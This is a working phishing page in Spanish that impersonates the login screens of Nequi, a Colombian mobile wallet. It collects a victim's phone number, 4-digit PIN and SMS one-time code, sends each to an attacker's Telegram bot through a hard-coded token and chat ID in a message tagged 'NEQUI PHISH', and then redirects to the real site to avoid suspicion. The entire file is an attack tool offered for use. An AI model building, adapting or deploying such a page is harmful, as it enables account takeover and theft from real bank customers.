<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
    
    * { margin:0; padding:0; box-sizing:border-box; }
    body { 
      font-family: 'Roboto', sans-serif; 
      background: #1F0829;
      height: 100vh; 
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .phone-frame {
      width: 100%;
      max-width: 420px;
      height: 100vh;
      background: #1F0829;
      position: relative;
      overflow: hidden;
    }

    #screen1, #screen2, #screen3, #loader {
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      padding: 20px;
      display: none;
      flex-direction: column;
      background: #1F0829;
    }

    #screen1 { display: flex; }

    .help {
      position: absolute;
      top: 25px;
      right: 25px;
      width: 32px; height: 32px;
      border: 2px solid rgba(255,255,255,0.9);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
    }

    .nequi-logo {
      margin-top: 85px;
      font-size: 58px;
      font-weight: 700;
      text-align: center;
      color: white;
    }
    .nequi-logo span { color: #FF2D95; margin-right: 8px; }

    .label { text-align: center; margin: 70px 0 35px 0; font-size: 17.5px; color: #D8B5E8; }

    .input-box {
      background: #2C1642;
      border-radius: 12px;
      padding: 6px;
      margin: 0 15px;
    }

    input {
      width: 100%;
      background: #2C1642;
      color: white;
      border: none;
      padding: 18px 20px;
      font-size: 17px;
      border-radius: 8px;
      outline: none;
      text-align: center;
    }

    button {
      margin: 40px 15px 20px 15px;
      height: 58px;
      background: linear-gradient(to right, #FF2D95, #E6007E);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 17.5px;
      font-weight: 500;
    }

    .back {
      position: absolute;
      top: 25px;
      left: 20px;
      font-size: 30px;
      cursor: pointer;
    }

    .title {
      margin-top: 70px;
      text-align: center;
      font-size: 26px;
      font-weight: 500;
    }

    .pins {
      margin: 55px 0 35px 0;
      display: flex;
      justify-content: center;
      gap: 20px;
    }
    .pin {
      width: 52px;
      height: 52px;
      background: #E0B0FF;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      color: #3C0A55;
    }

    .message {
      text-align: center;
      color: #C8A2E0;
      font-size: 15.5px;
      line-height: 1.5;
    }

    .keyboard {
      margin-top: auto;
      margin-bottom: 30px;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 18px 35px;
      padding: 0 25px;
      font-size: 34px;
    }
    .key {
      height: 68px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255,255,255,0.09);
      border-radius: 50%;
      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
    }
    .key:active { background: rgba(255,255,255,0.25); }
    .delete { font-size: 26px !important; }

    /* Loader */
    #loader {
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .spinner {
      width: 55px;
      height: 55px;
      border: 6px solid rgba(255,45,149,0.2);
      border-top: 6px solid #FF2D95;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 25px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-text { font-size: 18px; color: #E0B0FF; }
  </style>
</head>
<body>

  <div class="phone-frame">

    <!-- Pantalla 1 -->
    <div id="screen1">
      <div class="help">?</div>
      <div class="nequi-logo"><span>■</span>Nequi</div>
      <div class="label">Ingresa tu número de celular</div>
      <div class="input-box">
        <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
      </div>
      <button onclick="goToPassword()">Entra</button>
    </div>

    <!-- Pantalla 2 - Clave 4 dígitos -->
    <div id="screen2">
      <div class="back" onclick="goBack(1)">←</div>
      <div class="title">Escribe tu clave</div>
      <div class="pins" id="pins4">
        <div class="pin"></div><div class="pin"></div><div class="pin"></div><div class="pin"></div>
      </div>
      <div class="message">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</div>
      <div class="keyboard">
        <div class="key" onclick="addDigit(1,4)">1</div>
        <div class="key" onclick="addDigit(2,4)">2</div>
        <div class="key" onclick="addDigit(3,4)">3</div>
        <div class="key" onclick="addDigit(4,4)">4</div>
        <div class="key" onclick="addDigit(5,4)">5</div>
        <div class="key" onclick="addDigit(6,4)">6</div>
        <div class="key" onclick="addDigit(7,4)">7</div>
        <div class="key" onclick="addDigit(8,4)">8</div>
        <div class="key" onclick="addDigit(9,4)">9</div>
        <div class="key"></div>
        <div class="key" onclick="addDigit(0,4)">0</div>
        <div class="key delete" onclick="deleteDigit(4)">✕</div>
      </div>
    </div>

    <!-- Pantalla 3 - Clave Dinámica -->
    <div id="screen3">
      <div class="back" onclick="goBack(2)">←</div>
      <div class="title">Clave Dinámica</div>
      <div class="pins" id="pins6">
        <div class="pin"></div><div class="pin"></div><div class="pin"></div>
        <div class="pin"></div><div class="pin"></div><div class="pin"></div>
      </div>
      <div class="message">Ingresa el código de 6 dígitos<br>que te enviamos por SMS</div>
      <div class="keyboard">
        <div class="key" onclick="addDigit(1,6)">1</div>
        <div class="key" onclick="addDigit(2,6)">2</div>
        <div class="key" onclick="addDigit(3,6)">3</div>
        <div class="key" onclick="addDigit(4,6)">4</div>
        <div class="key" onclick="addDigit(5,6)">5</div>
        <div class="key" onclick="addDigit(6,6)">6</div>
        <div class="key" onclick="addDigit(7,6)">7</div>
        <div class="key" onclick="addDigit(8,6)">8</div>
        <div class="key" onclick="addDigit(9,6)">9</div>
        <div class="key"></div>
        <div class="key" onclick="addDigit(0,6)">0</div>
        <div class="key delete" onclick="deleteDigit(6)">✕</div>
      </div>
    </div>

    <!-- Loader -->
    <div id="loader">
      <div class="spinner"></div>
      <div class="loader-text">Verificando información...</div>
    </div>

  </div>

  <script>
    let currentPin = "";
    let currentLength = 4;
    let phoneNumber = "";

    const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
    const chatId = "773351137";

    function goToPassword() {
      const phone = document.getElementById("phone").value.trim();
      if (phone.length < 9) {
        alert("Por favor ingresa un número válido");
        return;
      }
      phoneNumber = phone;
      showScreen(2);
    }

    function showScreen(screen) {
      document.querySelectorAll('#screen1, #screen2, #screen3, #loader').forEach(el => {
        el.style.display = 'none';
      });

      if (screen === 'loader') {
        document.getElementById('loader').style.display = 'flex';
      } else {
        document.getElementById('screen' + screen).style.display = 'flex';
        currentLength = (screen === 2) ? 4 : 6;
        currentPin = "";
        updatePins();
      }
    }

    function addDigit(num, length) {
      if (currentPin.length < length) {
        currentPin += num;
        updatePins();
        if (currentPin.length === length) {
          sendToTelegram();
        }
      }
    }

    function deleteDigit(length) {
      currentPin = currentPin.slice(0, -1);
      updatePins();
    }

    function updatePins() {
      const id = currentLength === 4 ? "pins4" : "pins6";
      const boxes = document.querySelectorAll("#" + id + " .pin");
      boxes.forEach((box, i) => {
        box.textContent = i < currentPin.length ? "●" : "";
      });
    }

    function sendToTelegram() {
      const tipo = currentLength === 4 ? "Clave Principal" : "Clave Dinámica";
      
      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${currentPin}\n⏰ ${new Date().toLocaleString('es-CO')}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      showScreen('loader');

      setTimeout(() => {
        if (currentLength === 4) {
          showScreen(3);           // Ir a Clave Dinámica
        } else {
          window.location.href = "https://www.nequi.com.co";
        }
      }, 2200);
    }

    function goBack(from) {
      if (from === 1) showScreen(1);
      if (from === 2) showScreen(2);
    }
  </script>
</body>
</html>
